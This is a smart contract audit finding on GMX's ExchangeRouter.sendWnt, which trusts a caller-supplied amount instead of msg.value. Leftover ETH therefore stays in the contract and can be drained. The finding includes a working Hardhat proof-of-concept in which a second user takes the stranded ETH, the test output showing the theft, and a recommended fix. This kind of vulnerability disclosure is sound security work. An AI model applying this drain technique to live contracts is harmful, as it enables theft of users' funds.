# `sendWnt` function may have remaining ETH and can be stolen by anyone

## Summary

`sendWnt` function may have remaining ETH and can be stolen by anyone.

## Vulnerability Detail

```solidity
    // @dev Wraps the specified amount of native tokens into WNT then sends the WNT to the specified address
    function sendWnt(address receiver, uint256 amount) external payable nonReentrant {
        ReceiverUtils.validateReceiver(receiver);
        TokenUtils.depositAndSendWrappedNativeToken(dataStore, receiver, amount);
    }
```

The amount of ETH received by `sendWnt` function is `msg.value`, but the actual processing quantity is entered according to the amount.

Such a design is unreasonable, because it relies on the user is be trusted (impossible) or the ETH balance of the contract to always be 0 (when `amount > msg.value`, this contract will have insufficient balance to transfer money to the WNT contract).

## Impact

1. If the ETH transferred by the user is greater than the `amount`, the remaining of ETH will be stranded in the `ExchangeRouter` contract, resulting in loss of user's ETH.
2. When the `ExchangeRouter` contract contains ETH (such as the first point occurs or other situations), the attacker can steal all ETH through this function.

Here is my POC:

```js
  it("J4de audit test", async () => {
    // user0 paid more ETH than requested
    console.log("[*] exchangeRouter' ETH balance: " + await provider.getBalance(exchangeRouter.address));
    console.log("[*] user0 paid more ETH than requested");
    await exchangeRouter.connect(user0).multicall([
      exchangeRouter.interface.encodeFunctionData("sendWnt", [depositVault.address, expandDecimals(10, 18)])
    ], { value: expandDecimals(100, 18) });

    // The remaining ETH is now stored in the exchangeRouter contract
    console.log("[*] The remaining ETH is now stored in the exchangeRouter contract");
    console.log("[*] exchangeRouter' ETH balance: " + await provider.getBalance(exchangeRouter.address));

    // user1 steals the remaining ETH in exchangeRouter and sends WNT to its own address
    console.log("[*] user1's WNT balance: " + await wnt.balanceOf(user1.address));
    console.log("[*] user1 steals the remaining ETH in exchangeRouter and sends WNT to its own address");
    await exchangeRouter.connect(user1).multicall([
      exchangeRouter.interface.encodeFunctionData("sendWnt", [user1.address, expandDecimals(90, 18)])
    ], { value: 0 });
    console.log("[*] exchangeRouter' ETH balance: " + await provider.getBalance(exchangeRouter.address));
    console.log("[*] user1's WNT balance: " + await wnt.balanceOf(user1.address));
  });
```

Insert the above use case into the `ExchangeRouter.ts` file. The result of the operation is as follows:

```bash
J4de@J4de:~/gmx-synthetics$ npx hardhat test --grep "J4de audit test"


  ExchangeRouter
[*] exchangeRouter' ETH balance: 0
[*] user0 paid more ETH than requested
[*] The remaining ETH is now stored in the exchangeRouter contract
[*] exchangeRouter' ETH balance: 90000000000000000000
[*] user1's WNT balance: 0
[*] user1 steals the remaining ETH in exchangeRouter and sends WNT to its own address
[*] exchangeRouter' ETH balance: 0
[*] user1's WNT balance: 90000000000000000000
    âœ” J4de audit test (80ms)


  1 passing (13s)

```

user1 steals all ETH in the contract at zero cost and converts it into WETH to his own account.

## Recommendation

Use `msg.value` to handle logic instead of the `amount` passed in by the user.
